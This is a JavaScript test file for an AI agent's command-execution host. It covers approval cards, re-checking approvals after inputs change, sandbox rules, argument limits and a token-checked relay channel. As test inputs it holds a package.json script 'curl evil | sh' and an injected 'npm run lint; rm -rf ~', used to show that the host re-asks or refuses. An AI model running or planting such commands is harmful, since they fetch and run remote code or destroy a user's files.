// The exec tools' host (src/agent/exec-mcp.js) with a fake command session:
// what runs without a card, what asks, how an answer is checked again, and
// the private channel to the relay.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import { spawn } from 'node:child_process'
import { EXEC_MCP_NAME, argsWarning, createToolHost, serveToolHost, startExecSession } from '../src/agent/exec-mcp.js'
import { createApprovalStore } from '../src/agent/command-approvals.js'

const TEST = { name: 'test', run: 'npm test', argv: ['npm', 'test'], inputs: null, mutating: true, args: false, ready: null }
const JEST = { name: 'jest', run: 'npx jest', argv: ['npx', 'jest'], inputs: null, mutating: true, args: true, ready: null }

function capsOf(tier, { needsCard = tier === 'open', commands = ['test'], shell = { mode: 'off', network: 'none', exact: [] } } = {}) {
  return Object.freeze({
    tier,
    commands: commands.map((name) => ({ name, needsCard, mutating: true })),
    shell,
  })
}

function fakeSession(t, { mode = 'sandboxed', onRun = () => {} } = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-exec-host-'))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  fs.writeFileSync(path.join(root, 'package.json'), '{"scripts":{"test":"node --test"}}')
  const runs = []
  return {
    root,
    mode,
    network: 'registries',
    readOnly: false,
    runs,
    ports: () => [],
    allowPort() {},
    dropPort() {},
    async run(what) {
      runs.push(what)
      await onRun(what, root)
      return { code: 0, signal: null, output: 'ok\n', cut: 0, timedOut: false, stopped: false, ms: 5 }
    },
  }
}
const records = (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-exec-records-'))
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }))
  return createApprovalStore(dir)
}
const textOf = (result) => result.content.map((part) => part.text).join('')

test('solo: a named command whose inputs are as committed runs without a card', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  const result = await host.call('run_named_command', { name: 'test' })
  assert.equal(result.isError, false, textOf(result))
  assert.deepEqual(session.runs, [['npm', 'test']])
  assert.equal(asked.length, 0)
  assert.deepEqual(
    host.tools().map((tool) => tool.name),
    ['shapewall_capabilities', 'run_named_command'],
  )
})

test('solo: changing package.json asks again, and the answer is kept for those inputs only', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  fs.writeFileSync(path.join(session.root, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}')
  assert.equal((await host.call('run_named_command', { name: 'test' })).isError, false)
  assert.equal(asked.length, 1)
  assert.equal(asked[0].name, 'command')
  assert.match(asked[0].detail, /Asked again: the agent changed a file this command depends on/)
  // The same inputs again: the record holds.
  await host.call('run_named_command', { name: 'test' })
  assert.equal(asked.length, 1)
  fs.writeFileSync(path.join(session.root, 'package.json'), '{"scripts":{"test":"other"}}')
  await host.call('run_named_command', { name: 'test' })
  assert.equal(asked.length, 2)
})

test('open: the same command asks with a card first; a denial runs nothing', async (t) => {
  const session = fakeSession(t)
  let answer = 'denied'
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('open'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), answer),
  })
  const denied = await host.call('run_named_command', { name: 'test' })
  assert.equal(denied.isError, true)
  assert.match(textOf(denied), /denied/)
  assert.equal(session.runs.length, 0)
  assert.match(asked[0].detail, /npm test/)
  assert.match(asked[0].detail, /someone outside the people this machine trusts/)
  answer = 'approved'
  assert.equal((await host.call('run_named_command', { name: 'test' })).isError, false)
  assert.equal(session.runs.length, 1)
})

test('an allow is checked against the resolver again: a narrower answer, a changed line or inputs, and nothing runs', async (t) => {
  const session = fakeSession(t)
  let fresh = capsOf('open')
  let line = TEST
  let during = () => {}
  const host = createToolHost({
    capabilities: capsOf('open'),
    recheck: () => fresh,
    commands: [TEST],
    readCommands: () => [line],
    session,
    approvals: records(t),
    ask: async (card) => {
      during()
      // The card's own check is what the machine runs when the answer comes in (agent-link.js onAnswer).
      assert.equal(typeof card.recheck, 'function')
      return 'approved'
    },
  })
  // Commands were taken away while the card waited.
  during = () => (fresh = capsOf('open', { commands: [] }))
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /changed, or is no longer allowed|no longer allowed/)
  // The command line changed in the checkout's config.
  fresh = capsOf('open')
  during = () => (line = { ...TEST, run: 'npm test -- --watch' })
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /changed, or is no longer allowed/)
  // package.json changed while it waited.
  line = TEST
  during = () => fs.writeFileSync(path.join(session.root, 'package.json'), '{"changed":true}')
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /changed, or is no longer allowed/)
  assert.equal(session.runs.length, 0)
  // Not in the resolved list at all: refused before any card.
  fresh = capsOf('open', { commands: [] })
  assert.match(textOf(await host.call('run_named_command', { name: 'test' })), /not allowed on this turn/)
})

test('no OS sandbox (host mode): a named command asks even on solo', async (t) => {
  const session = fakeSession(t, { mode: 'host' })
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  await host.call('run_named_command', { name: 'test' })
  assert.equal(asked.length, 1)
  assert.match(asked[0].detail, /without an OS sandbox/)
})

test('args: only where the config allows them, bounded, and the card says they are arbitrary code', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('open', { commands: ['test', 'jest'] }),
    commands: [TEST, JEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  assert.match(textOf(await host.call('run_named_command', { name: 'test', args: ['--x'] })), /takes no arguments/)
  assert.match(textOf(await host.call('run_named_command', { name: 'jest', args: ['a\0b'] })), /args: up to/)
  assert.match(textOf(await host.call('run_named_command', { name: 'jest', args: Array(21).fill('x') })), /args: up to/)
  await host.call('run_named_command', { name: 'jest', args: ['--runInBand'] })
  assert.deepEqual(session.runs.at(-1), ['npx', 'jest', '--runInBand'])
  assert.match(asked.at(-1).detail, /arbitrary code/)
  assert.match(argsWarning(JEST), /npx, jest and similar runners/)
  assert.match(argsWarning({ ...JEST, argv: ['node', 'x.js'] }), /node, as for npx, jest and similar runners/)
  assert.equal(argsWarning(TEST), null)
  // Unknown names.
  assert.match(textOf(await host.call('run_named_command', { name: 'deploy' })), /not allowed|not a command/)
})

test('exact commands: character for character, and a card each', async (t) => {
  const session = fakeSession(t)
  const asked = []
  const host = createToolHost({
    capabilities: capsOf('open', { shell: { mode: 'exact', network: 'none', exact: ['npm run lint'] } }),
    commands: [TEST],
    session,
    approvals: records(t),
    ask: async (card) => (asked.push(card), 'approved'),
  })
  assert.match(textOf(await host.call('run_command', { command: 'npm run lint; rm -rf ~', reason: 'x' })), /character for character/)
  assert.equal(asked.length, 0)
  const ok = await host.call('run_command', { command: 'npm run lint', reason: 'check style' })
  assert.equal(ok.isError, false, textOf(ok))
  assert.deepEqual(session.runs.at(-1), ['npm', 'run', 'lint'])
  assert.match(asked[0].detail, /check style/)
})

test('the full shell runs only in the sandbox it was resolved for', async (t) => {
  const sandboxed = { mode: 'sandboxed', network: 'registries', exact: [] }
  const host = createToolHost({
    capabilities: capsOf('solo', { shell: sandboxed }),
    commands: [TEST],
    session: fakeSession(t, { mode: 'host' }),
  })
  assert.match(textOf(await host.call('run_command', { command: 'ls', reason: 'look' })), /OS sandbox did not start/)
  const session = fakeSession(t)
  const boxed = createToolHost({ capabilities: capsOf('solo', { shell: sandboxed }), commands: [TEST], session })
  assert.equal((await boxed.call('run_command', { command: 'ls -la', reason: 'look' })).isError, false)
  assert.deepEqual(session.runs.at(-1), { shell: 'ls -la' })
})

test('files a command changed are reported, so the fix is held for a look', async (t) => {
  const session = fakeSession(t, { onRun: (what, root) => fs.writeFileSync(path.join(root, 'snapshot.txt'), 'new') })
  const changes = []
  const host = createToolHost({
    capabilities: capsOf('solo'),
    commands: [TEST],
    session,
    approvals: records(t),
    onChanged: (diff) => changes.push(diff),
  })
  await host.call('run_named_command', { name: 'test' })
  assert.deepEqual(changes, [{ changed: ['snapshot.txt'], deleted: [] }])
})

test('startExecSession fails closed', async (t) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-exec-start-'))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  const sandboxed = { mode: 'sandboxed', network: 'registries', exact: [] }
  // Nothing to offer.
  assert.equal(await startExecSession({ capabilities: capsOf('solo', { commands: [] }), platform: { sandbox: true }, root }), null)
  // A full shell resolved for a sandbox this machine does not have.
  assert.equal(await startExecSession({ capabilities: capsOf('solo', { shell: sandboxed }), platform: { sandbox: false }, root }), null)
  // A root that is not the fix copy.
  assert.equal(
    await startExecSession({ capabilities: capsOf('open'), platform: { sandbox: false }, root, expect: os.tmpdir(), commands: [TEST] }),
    null,
  )
  // Host mode works where it may (open tier: a card each).
  const exec = await startExecSession({
    capabilities: capsOf('open'),
    platform: { sandbox: false },
    root,
    within: path.dirname(root),
    commands: [TEST],
  })
  assert.ok(exec)
  assert.equal(exec.session.mode, 'host')
  assert.equal(exec.servers[0].name, EXEC_MCP_NAME)
  await exec.close()
  assert.equal(fs.existsSync(path.dirname(exec.servers[0].args[1])), false, 'the policy folder goes with the session')
})

// ---- The private channel ----

function callOver(socket, line) {
  return new Promise((resolve) => {
    const conn = net.connect(socket)
    let buffer = ''
    conn.setEncoding('utf8')
    conn.on('data', (chunk) => {
      buffer += chunk
      if (buffer.includes('\n')) {
        conn.destroy()
        resolve(JSON.parse(buffer.slice(0, buffer.indexOf('\n'))))
      }
    })
    conn.on('close', () => resolve(null))
    conn.on('error', () => resolve(null))
    conn.write(line + '\n')
  })
}

test('the relay channel: 0600 policy file, token checked, gone at close', { skip: process.platform === 'win32' }, async (t) => {
  const session = fakeSession(t)
  const host = createToolHost({ capabilities: capsOf('solo'), commands: [TEST], session, approvals: records(t) })
  const served = await serveToolHost(host)
  t.after(() => served.close())
  const file = served.servers[0].args[1]
  assert.equal((fs.statSync(file).mode & 0o777).toString(8), '600')
  assert.equal((fs.statSync(path.dirname(file)).mode & 0o777).toString(8), '700')
  const policy = JSON.parse(fs.readFileSync(file, 'utf8'))
  assert.deepEqual(
    policy.tools.map((tool) => tool.name),
    ['shapewall_capabilities', 'run_named_command'],
  )
  assert.equal(
    await callOver(policy.socket, JSON.stringify({ id: 1, token: '00'.repeat(32), name: 'run_named_command', args: { name: 'test' } })),
    null,
  )
  assert.equal(await callOver(policy.socket, JSON.stringify({ id: 1, name: 'run_named_command', args: { name: 'test' } })), null)
  assert.equal(session.runs.length, 0)
  const answer = await callOver(
    policy.socket,
    JSON.stringify({ id: 7, token: policy.token, name: 'run_named_command', args: { name: 'test' } }),
  )
  assert.equal(answer.id, 7)
  assert.equal(answer.result.isError, false)
  assert.equal(session.runs.length, 1)
})

test('the relay speaks MCP over stdio and passes calls to the host', { skip: process.platform === 'win32' }, async (t) => {
  const session = fakeSession(t)
  const host = createToolHost({ capabilities: capsOf('solo'), commands: [TEST], session, approvals: records(t) })
  const served = await serveToolHost(host)
  t.after(() => served.close())
  const [entry] = served.servers
  const child = spawn(entry.command, entry.args, { stdio: ['pipe', 'pipe', 'inherit'] })
  t.after(() => child.kill())
  const replies = new Map()
  let buffer = ''
  child.stdout.setEncoding('utf8')
  child.stdout.on('data', (chunk) => {
    buffer += chunk
    let index
    while ((index = buffer.indexOf('\n')) >= 0) {
      const message = JSON.parse(buffer.slice(0, index))
      buffer = buffer.slice(index + 1)
      replies.get(message.id)?.(message)
    }
  })
  const rpc = (id, method, params) =>
    new Promise((resolve) => {
      replies.set(id, resolve)
      child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n')
    })
  await rpc(1, 'initialize', { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'test', version: '1' } })
  child.stdin.write(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }) + '\n')
  const listed = await rpc(2, 'tools/list', {})
  assert.ok(listed.result.tools.some((tool) => tool.name === 'run_named_command'))
  const called = await rpc(3, 'tools/call', { name: 'run_named_command', arguments: { name: 'test' } })
  assert.match(called.result.content[0].text, /exit code 0/)
  assert.equal(session.runs.length, 1)
})
